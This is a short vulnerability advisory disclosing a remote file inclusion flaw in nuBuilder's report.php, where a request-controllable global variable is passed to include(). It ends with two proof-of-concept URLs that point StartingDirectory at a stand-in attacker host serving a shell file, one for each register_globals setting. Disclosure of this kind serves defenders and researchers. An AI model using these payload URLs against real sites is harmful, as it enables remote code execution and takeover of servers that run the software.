@@ -1,0 +1,41 @@
+Software: nuBuilder 10.04.x and lower(maybe)?
+Type: Remote File Inclusion
+Download: http://sourceforge.net/projects/nubuilder/files/
+Author: Ahlspiess
+Email: ahlspiess@tbdsecurity.com
+
+Vulnerable file: report.php
+
+report.php file content
+1 	<?php
+2 	/*
+3 	** File: report.php
+4 	** Author: nuSoftware
+5 	** Created: 2007/04/26
+6 	** Last modified: 2009/07/15
+7 	**
+8 	** Copyright 2004, 2005, 2006, 2007, 2008, 2009 nuSoftware
+9 	**
+10 	** This file is part of the nuBuilder source package and is licensed under the
+11 	** GPLv3. For support on developing in nuBuilder, please visit the nuBuilder
+12 	** wiki and forums. For details on contributing a patch for nuBuilder, please
+13 	** visit the `Project Contributions' forum.
+14 	**
+15 	** Website: http://www.nubuilder.com
+16 	** Wiki: http://wiki.nubuilder.com
+17 	** Forums: http://forums.nubuilder.com
+18 	*/
+19 	
+20 	include($GLOBALS['StartingDirectory']."/database.php");  <== interesting huh?
+
+POC
+Succesfully tested against php config register_global = On and Off, allow_url_include = On
+
+register_global = Off
+http://site.tld/report.php?StartingDirectory=http://attacker.tld/shell.txt?
+
+register_global = On
+http://site.tld/report.php?GLOBALS[StartingDirectory]=http://attacker.tld/shell.txt?
+
+
+#EOF
